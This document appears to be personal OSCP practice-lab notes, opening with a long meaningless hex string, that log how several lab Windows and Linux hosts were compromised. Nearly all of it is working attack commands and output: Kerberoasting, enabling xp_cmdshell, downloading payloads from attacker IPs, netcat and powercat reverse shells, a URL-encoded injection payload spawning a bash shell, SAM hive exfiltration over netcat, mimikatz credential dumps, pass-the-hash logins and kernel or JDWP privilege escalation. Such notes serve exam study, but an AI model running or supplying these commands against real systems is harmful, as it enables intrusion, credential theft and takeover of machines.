FF642F69AAB6C1DFEAC5DC78F36A8274C1ED0B0F55BCE902DC5679B85DFEE13B764FD12EBE84B67E3ECDF0CA96445B5E5B749FE470CD003D3C5790C246170B0AB98F61A2B737EC469335E9EE8A2118585C977EA55732DC4B7DFAB42656A04EEB41ACABC95A297722BE1B084D27197943E6DD1ED109B13FFFA6FBB5E283E74E6EA92A25225BF74EE33BAC4FB9078337562E62577FF12C29DC3E2FFC9FE7BDED17E17ED6033AE49C7063841CE2E6C447CB71E71D644F1F419A97FDC0A169CABC74226B9A2694439B59106BCAE5226A8C6D6A0CCB391347F08E3A69BA5935EC6C91B4C46059AA80D964233956D2E94C07C33696EA05614EA59A47FB8CFE13D4C80891D7BBC3C0098B1F1762448ADE633F3F75FD59FE01ADA1978CCC7AECFB339BF7B8AE7548F6FEA881B8EE4C2EF3305D85FB801502D013B470DC289402F3D834F6E1AED88CBE2B23CE51CE5EBC467EE15851D969DCBD31B65A885F79BBD286B0039E0883DC1A0BF414178E8174C84E44228B82C8F98461941ACA82AA266E01D1EAF18971CC62073AF43F2FD1C5817F2A7D9CCC4EFE0294A4802453024346342F6FCF601E8C84DE6BE47B7C09B63A226F9E938469A7EFEEBD070438E38917EE75E6F5DFC1B55590D20FE8259027CCBB09C7D3DEB5D30C3EE72C957029C55F0252016D3E399068C22DBBB6DD75F830CB07F6E65D61A39EA9A5193506B53102046A55FA24A64A288ECCB67C1C226DD6617719F42673B2E01A816BFDDAC35BEFB3C571C41A0CA559B09FEBA29C64D65E9206B03F068A867BE8BD396390B8E080A4F367E0350F20E64F61C7DC68E3402039A1D8AE933CD3453A90FADD27B6146CC92AAB43DACDFF63FE931A55A41CA56E0118E7B1F3E865D2B233E1D010E81FEE0C2086FD9D72C071AD741800DEE8F8159588D315DF8FF675173C0E70332134A56D7991F0A54FA1590D891C80E9A1818563EDC7501EF34CC6FD19CED204D859E1CC437988F9BF8017E58ED0743A951D3C47FDF4CB889D48AB2CD54C7B464857B555CC4A7994A36B1F9AF421DBCC1D26BECBD9C5C74869D24AE875DAC10A189E7AC8356F16BAF23354F55AB7ADEE9F6A9B45563D7CB3AD81D2AE058C9CD7A0B952BA1C54BB58B72B8D700C0B3F1D9C059AEF821A7DF009734B6A477FF6E83DEC5AECACF2A872BD47A028435BB08509F7136C4B18A110F2ACAF6EC490E2142DD456BBD0586D8173EA9EF4E06E0DD8EFD5209E99B89770D6BE29D91E34EB2BECB4385ABD06592898088DD8BDE1C4B8A713C64C6FF68BC4A33874E2123E3887C92156D0CD54DDDDE719A4CF5DA6229CDCF79D42D78349648D9C01EDC14D2FFEBF69A425A55287FE049233E72E30B1394F70D6288ACF5E28F41DB4FC008FB471C208458754087242B2ED2D27B6DD92DC5C33A5FD8899DA83CC6669CD11B9E83EA80815478C143842ABC8E0

In the Discord chat error with rubeus.exe try with impacket-GetUserSPNs
impacket-GetUserSPNs -dc-ip 192.168.193.147 oscp.exam/web_svc:Diamond1 -request
impacket-GetNPUsers -dc-ip 192.168.193.147 oscp.exam/web_svc:Diamond1 -request

Try internal IP connect using Ligolo-NG
impacket-GetUserSPNs -dc-ip 10.10.153.146 oscp.exam/web_svc:Diamond1 -request
john -w=/home/kali/HTB/OSCP/rockyou.txt sql_svc147.hash (sql_svc:Dolphin1)

#Lateral Movement
crackmapexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -x "whoami"
MSSQL       10.10.125.148   1433   MS02             [+] oscp.exam\sql_svc:Dolphin1 (Pwn3d!)
MSSQL       10.10.125.148   1433   MS02             nt service\mssql$sqlexpress

crackmapexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -x 'certutil -urlcache -f http://192.168.45.220/rev1234.exe C:\Windows\Temp\rev1234.exe' # Access Denied
crackmapexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -x "certutil -urlcache -f http://192.168.45.220/rev1234.exe C:/Windows/Temp/rev1234.exe"  # None

netexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -x ipconfig
netexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -q 'SELECT name FROM master.dbo.sysdatabases;'    #master, tempdb, model, msdb
netexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -q 'SELECT name, password_hash FROM master.sys.sql_logins;'
MSSQL       10.10.125.148   1433   MS02             name:sa
MSSQL       10.10.125.148   1433   MS02             password_hash:b'0200bb05745ecc4aa4c3f07811d805a3bb895e68fd68df9cb25e8baf0f3b4fb736957f686de4e57fc3fb836e681efc4ac53641e8736227dae626fbb04b74f4323078d7b22c4b'
MSSQL       10.10.125.148   1433   MS02             name:##MS_PolicyEventProcessingLogin##
MSSQL       10.10.125.148   1433   MS02             password_hash:b'0200cc545e5f2603ca26d2b47d6ff480ae995e691e03e7602298ab35bcaf1b610905d9eb6037966508a38a4f690ece1fdf35e6687e3ebd7647fecd77309f0dbf73439bfcaff6'
MSSQL       10.10.125.148   1433   MS02             name:##MS_PolicyTsqlExecutionLogin##
MSSQL       10.10.125.148   1433   MS02             password_hash:b'0200eee47937685015f4a19498e211a40c6444edc9ac8e5ca8080c0d615cb069f10655918ae144fbe2fb000135d7191e32e783636e31b103488cf5b513f7bde718f742f770e5'

netexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -q 'select  loginname from syslogins where sysadmin = 1;' 
MSSQL       10.10.125.148   1433   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
MSSQL       10.10.125.148   1433   MS02             [+] oscp.exam\sql_svc:Dolphin1 (Pwn3d!)
MSSQL       10.10.125.148   1433   MS02             loginname:sa
MSSQL       10.10.125.148   1433   MS02             loginname:MS02\Administrator
MSSQL       10.10.125.148   1433   MS02             loginname:OSCP\sql_svc
MSSQL       10.10.125.148   1433   MS02             loginname:NT SERVICE\SQLWriter
MSSQL       10.10.125.148   1433   MS02             loginname:NT SERVICE\Winmgmt
MSSQL       10.10.125.148   1433   MS02             loginname:NT Service\MSSQL$SQLEXPRESS

crackmapexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -q "EXEC xp_cmdshell 'whoami'"

impacket-mssqlclient sql_svc:Dolphin1@10.10.125.148 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
#Now we can run commands
EXECUTE xp_cmdshell 'whoami';

#After successfully partial command shell observe the commands with syntax both are same caution EXECUTE
EXECUTE xp_cmdshell 'whoami';
xp_cmdshell powershell -c ls;
Not able to upload shell

.\nc.exe 10.10.125.148 1122 > sam
xp_cmdshell powershell -c Get-Content sam | .\C:/Users/Public/nc.exe 10.10.125.147 1122
xp_cmdshell powershell -c .\C:/Users/Public/nc.exe 10.10.125.147 1122 < sam

#After successfully partial command shell observe the commands with syntax both are same caution EXECUTE
EXECUTE xp_cmdshell 'whoami';
xp_cmdshell powershell -c ls;

Copy-Item -Path C:\windows.old\Windows\system32\sam -Destination C:/Users/Public
xp_cmdshell powershell -c Copy-Item -Path C:\windows.old\Windows\system32\sam -Destination C:/Users/Public;
xp_cmdshell powershell -c Copy-Item -Path C:\windows.old\Windows\system32\system -Destination C:/Users/Public;

$client = New-Object System.Net.Sockets.TcpClient("10.10.125.147", 1122) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:/Users/Public/sam")  
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

nc -lvp 1234 > sam 

xp_cmdshell powershell -c ls C:/Users/Public

‘;EXEC xp_cmdshell ’powershell -c “IEX(New-Object System.Net.WebClient).DownloadString(”http://192.168.45.161/powercat.ps1;powercat -c 192.168.45.161 -p 4444 -e cmd;--

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.161/powercat.ps1');powercat -c 192.168.45.161 -p 4444 -e cmd"

ssh user@192.168.x.147 -D9090 -R :7777:localhost:7777 -R:8888:localhost:8888 
xp_cmdshell powershell -c iwr -uri http://192.168.45.161/PrintSpoofer64.exe -Outfile PrintSpoofer.exe

ssh user@192.168.193.147 -D9090 -R :7777:localhost:7777 -R:8888:localhost:8888 

Downloading file 7777
python3 -m http.server 7777
xp_cmdshell powershell -c iwr -uri http://10.10.153.147:7777/nc.exe -Outfile C:\Users\Public\nc.exe

Reverse shell used port 8888
xp_cmdshell powershell -c C:\Users\Public\nc.exe 10.10.153.147 8888 -e cmd
 rlwrap nc -nlvp 8888
 #Got shell

iwr -uri http://10.10.153.147:7777/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe

reg save hklm\sam c:\sam
reg save hklm\system c:\system

Internal machine 148---------------------
PS C:\Users\Public> Get-Content C:\sam | .\nc.exe 10.10.153.147 8888
Get-Content C:\sam | .\nc.exe 10.10.153.147 8888
PS C:\Users\Public> Get-Content C:\system | .\nc.exe 10.10.153.147 8888
Get-Content C:\system | .\nc.exe 10.10.153.147 8888

Kali Machine-------------------------
nc -lvp 8888 > system
listening on [any] 8888 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 50452

Another impacket-mssqlclientFinally downloaded in impacket-mssqlclient
xp_cmdshell powershell -c iwr -uri http://10.10.153.147:7777/mimicatz.exe -Outfile C:\Users\Public\mimicatz.exe;

.\mimicatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
* Username : Administrator
         * Domain   : OSCP
         * NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5
         
         
         
evil-winrm -i 10.10.153.146 -u Administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
#Got Admin shell

```

### OSCPB - SNMP and git - Linux

```jsx
By observing the Nmap result 3 ports are open
Nmap
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Try gobuster with port 80
gobuster dir -u http://192.168.217.149/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
gobuster dir -u http://192.168.217.149/ -w /usr/share/wordlists/dirb/big.txt       

Tried  FTP port 21 vsftpd 3.0.3 with searchsploit exploits
Tried SSH port 22 with OPENSSH 8.2p1 with searchsploit exploits

Nothing worked checked hints SNMP UDP Username Enumeration
snmp-check 192.168.171.149
>sudo nmap -A 192.168.171.149 -sU -p 160,161   
snmp       SNMPv1 server; net-snmp SNMPv3 server (public)

snmpwalk -c public -v1 192.168.171.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
NET-SNMP-EXTEND-MIB::nsExtendArgs."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."RESET" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."RESET" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."RESET" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."RESET" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."RESET" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value

ssh kiero@192.168.171.149 (# kiero, john, password)
ssh john@192.168.171.149 (# kiero, john, password)
hydra -L 149_users.txt -P /home/kali/HTB/OSCP/rockyou.txt 192.168.171.149 ssh (# kiero, john users text file)
Hint Mentioned Don't thing to much like admin:admin in different service

ftp 192.168.171.149 (#kiero)
Found 3 id_rsa keys

#Got local Flag

Privilege Escalation
Executing Linux Exploit Suggester
https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops                                                                                                                                                                              

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe
>./ sh compile.sh
> sh compile.sh /usr/bin/sudo
> ./compile.sh /usr/bin/sudo

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

gcc --version
./ sh compile.sh # No luck
sh compile.sh /usr/bin/sudo
./compile.sh /usr/bin/sudo
# Downloaded exploit-2.c from above Github repository
gcc -o exploit-2 exploit-2.c
./exploit-2 /usr/bin/sudo
# Got root shell
```

### OSCPB -  8021 TCP FreeSWITCH - Windows

```jsx
192.168.206.151

NMAP PORT
80/tcp       open  http                					Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server         Microsoft Terminal Services
8021/tcp open  freeswitch-event     FreeSWITCH mod_event_socket

Port 8021 is the default TCP port that FreeSWITCH uses to listen for and execuete system commands via the event socket interface.
FreeSWITCH is a free, open-source software stack that enables real-time communication, video, and Voice over Internet Protocol (VoIP)

Serched in the searchsploit and then https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/windows/flatline
python3 47799_exploit.py 192.168.206.151 'whoami'  
python3 47799_exploit.py 192.168.206.151 'type C:\Users\chris\Desktop\local.txt'
python3 47799_exploit.py 192.168.206.151  'net user /add ashok Password@123! && net localgroup "Administrators" /add ashok' error
python3 47799_exploit.py 192.168.206.151 ‘certutil.exe -urlcache -f http://192.168.45.220/nc.exe C:\Users\chris\Desktop\nc.exe’
python3 47799_exploit.py 192.168.206.151 'dir  C:\Users\chris\Desktop\'
#Netcat was downloaded
python3 47799_exploit.py 192.168.206.151 'C:\Users\chris\Desktop\nc.exe 192.168.45.220 1234 -e powershell.exe'
rlwrap nc -nlvp 1234
#Got Local Shell 

whoami /priv                                                                                                                                                                                                                                                                                                                                                                                                                              
Privilege Name             												   Description                              				 State                                                                                                                                                               
================== ================================ ===============                                                                                                                                                         
SeImpersonatePrivilege        Impersonate a client after authentication 					Enabled   

iwr -uri http://192.168.45.220/DeadPotato-NET4.exe -Outfile DeadPotato.exe
.\DeadPotato.exe -cmd whoami
#nt authority
 .\DeadPotato.exe -newadmin ashok:Ashok@123!
 #The command completed successfully. 
net localgroup adminisrators
#ashok user in the admin group

>xfreerdp /u:ashok /p:'Ashok@123!' /v:192.168.206.151 /smart-sizing:1920x1080 /cert-ignore  +clipboard
GOT root

```

### OSCPB - http-proxy Spring Java Framework, jdwp-shellifier.py- Linux

```jsx
192.168.206.150

NMAP 
22/tcp        open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy

Tried this link CVE-2022-42889

#Google Search exploit http-proxy Spring Java Framework https://www.exploit-db.com/exploits/50799

python3 50799.py http://192.168.206.150:8080 whoami
python3 50799.py http://192.168.206.150:8080 id
python3 50799.py http://192.168.206.150:8080 'id'   #Error no luch

Tried this based CVE exploit https://github.com/crowsec-edtech/CVE-2022-22947.git
[X] Error: Fail to deploy stage (Patched ?)

http://192.168.206.150:8080/search
#{"query":"*","result":""}
http://192.168.206.150:8080/search?query=whoami
{"query":"whoami","result":""}  # So query command is parameter is working

${script:javascript:java.lang.Runtime.getRuntime()exec(‘’)}
http://192.168.206.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29exec%28%E2%80%98whoami%E2%80%99%29%7D
#{"query":"${script:javascript:java.lang.Runtime.getRuntime()exec(‘whoami’)}","result":""}

${script:javascript:java.lang.Runtime.getRuntime()exec(‘nc 192.168.45.220 1234 -e /bin/bash’)}          #URL Encode
curl 'http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29exec%28%E2%80%98nc%20192.168.45.220%201234%20-e%20%2Fbin%2Fbash%E2%80%99%29%7D'

Try shell 
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f elf > linux1234.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f sh > linux1234.sh

Question-OSCPB 150, for initial foothold, http://192.168.206.150:8080/search?query=whoami output will not printing {"query":"whoami","result":""} just printing the parameter we are searching, how we can proced with rev shell ? any help
HInt - https://discord.com/channels/780824470113615893/1087927556604432424/1255218982634651793
                                              
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f elf > linux1234.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f sh > linux1234.sh
# These shells are downloaded from the python server but no shell, The IP Address kali IP Address

# After Searching in the Medium link and Discord found this way to create shell
echo "bash -i >& /dev/tcp/192.168.45.220/443 0>&1" > shell
# In Browser
http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27wget%20192.168.45.220%2Fshell%20-O%20%2Ftmp%2Fshell%27)%7D
http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27bash%20%2Ftmp%2Fshell%27)%7D
rlwrap nc -nlvp 443
#Got shell

#Run the LinPEAS Transfored using

Run first Kali > nc -lvp 1234 > 150_linpeas.txt
Target >   nc <target_ip> 1234 < 150_linpeas.txt

Executing Linux Exploit Suggester
https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)                                                                                                                                                                                        

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: probable
   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe - No Shell

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE No Shell

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
   
   
Processes, Crons, Timers, Services and Sockets   
root         854  0.0  1.7 2528964 34744 ?       Ssl  15:33   0:00 java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
   
   
    ssh ... -L 8000:127.0.0.1:8000
    
    
    git clone https://github.com/hugsy/jdwp-shellifier.git
python3 jdwp-shellifier.py -c "/bin/busybox nc 192.168.45.161 443 -e /bin/bash"

python3 jdwp-shellifier.py -t 192.168.45.161 -p 443    # Triggered but no shell
python3 jdwp-shellifier.py -c "/bin/busybox 192.168.45.161 443 -e /bin/bash"

--------------------------------Process
revert the machine once more and try it again.
forward the port with 

 ssh -i id_rsa dev@192.168.x.150 -L 8000:127.0.0.1:8000 
then try  python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "chmod u+s /bin/bash" 
you can also use nmap to confirm the forwarded port is open
on the target, (in the ssh session or whatever shell) run nc 127.0.0.1 5000
and you should see some activity in your exploit
this command should set the uid bit on the bash binary, so /bin/bash -p will give you a root shell
--------------------------------Process

ssh-keygen -t rsa -b 4096
After generating the SSH keys on the target machine using ssh-keygen, add the contents of the id_rsa.pub file to the authorized_keys file with cat id_rsa.pub > authorized_keys, and then log in using the private key.

ssh -i id_rsa150 dev@192.168.197.150 -L 8000:127.0.0.1:8000
check sudo nmap -p 8000 127.0.0.1

150>python3 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "chmod u+s /bin/bash"
>ll /bin/bash
>nc 127.0.0.1 5000 
CTRL+Z it don't session, it will close the nc session
>ll /bin/bash
>/bin/bash -p

Redone steps
Target .150 >nc 127.0.0.1 5000 -z
#Now SUID set 
>/bin/bash -p
>id 
euidis root
#ROOT SHELL

```

# OSCP C

## OSCPC AD 153

```jsx
192.168.179.153 -    - AD
Nmap
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http          Microsoft IIS httpd 10.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

SMB
smbmap -H 192.168.179.153 -u '' # 0 SMB Session
smbclient -L //192.168.179.153
smbclient -L ////192.168.179.153 -U ''
smbclient -L //192.168.179.153 -U '' -P ''
rpcclient 192.168.179.153
rpcclient -U="" 192.168.179.153
enum4linux 192.168.179.153 
enum4linux -a 192.168.179.153 

netexec smb 192.168.179.153 -u "" -p ""      #Access Denied

HTTP
gobuster dir -u http://192.168.179.153:8000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
http://192.168.179.153:8000/partner/ #403
http://oscp.exam:8000/aspnet_client/ #403
http://oscp.exam:8000/aspnet_client/system_web/ #403

feroxbuster --url http://oscp.exam:8000/ --insecure --filter-status 404 
http://oscp.exam:8000/partner/CHANGELOG #200
http://oscp.exam:8000/partner/Db #200

In the DB has the sqllitebrowser identified usernames and password, The SQLITEBROWSER GUI opened 
cat users.txt 
ecorp
support
bcorp
acorp

cat pass.txt        
Freedom1
ecorp

ssh support@192.168.157.153  (#Freedom1)
#GOT INTIAL SHELL
whoami /priv                                                                    
Privilege Name                Description                          State  
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

PRIV ESC
iwr -uri http://192.168.45.161/winPEASx64.exe -Outfile winPEAS.exe 
.\winPEAS.exe > 153winPEAS.txt
iwr -uri http://192.168.45.161/nc.exe -Outfile nc.exe  

nc -lvp 1122 > 153winPEAS.txt 
Get-Content .\153winPEAS.txt | .\nc.exe 192.168.45.161 1122
SharpHound.exe is not compatable 
Import-module ./SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Both SharpHound.exe, SharpHound.ps1 Unable to connect to LDAP, verify your credentials no output is generated

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue # Nothing

winPEAS
Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\support\winPEAS.exe": support [AllAccess]
     File Permissions "C:\Users\support\admintool.exe": support [AllAccess]

support@MS01 C:\Users\support>admintool.exe whoami
Enter administrator password:

thread 'main' panicked at 'assertion failed: `(left == right)`
  left: `"d41d8cd98f00b204e9800998ecf8427e"`,
 right: `"05f8ba9f047f799adbea95a16de2ef5d"`: Wrong administrator password!', src/main.rs:78:5
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace

 d41d8cd98f00b204e9800998ecf8427e - Nothing
 05f8ba9f047f799adbea95a16de2ef5d- December31

evil-winrm -i 192.168.157.153 -u Administrator -p December31
#Got shell ms01 amdin

Poviting with Ligolo-NG
10.10.117.154
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Saving Creds from the sam and system, from the Mimicatz nothing found
reg save hklm\sam c:\sam
reg save hklm\sam c:\system
Get-Content C:\sam | .\nc.exe 192.168.45.161 1122
nc -lvp 1122 > sam  

impacket-secretsdump -system system -sam sam local 
[-] Can't find root key!
[-] 'NoneType' object is not subscriptable
[*] Cleaning up... 

#HInt
type C:\Users\Administrator\appdata\roaming\microsoft\windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd

nxc smb 10.10.117.154 -d oscp.exam -u users.txt -p pass.txt --continue-on-success
nxc winrm 10.10.117.154 -d oscp.exam -u users.txt -p pass.txt --continue-on-success
nxc winrm 10.10.117.154 -u users.txt -p pass.txt --continue-on-success --local-auth
#WINRM       10.10.117.154   5985   MS02             [+] MS02\administrator:hghgib6vHT3bVWf (Pwn3d!)

evil-winrm -i 10.10.117.154 -u administrator -p hghgib6vHT3bVWf   
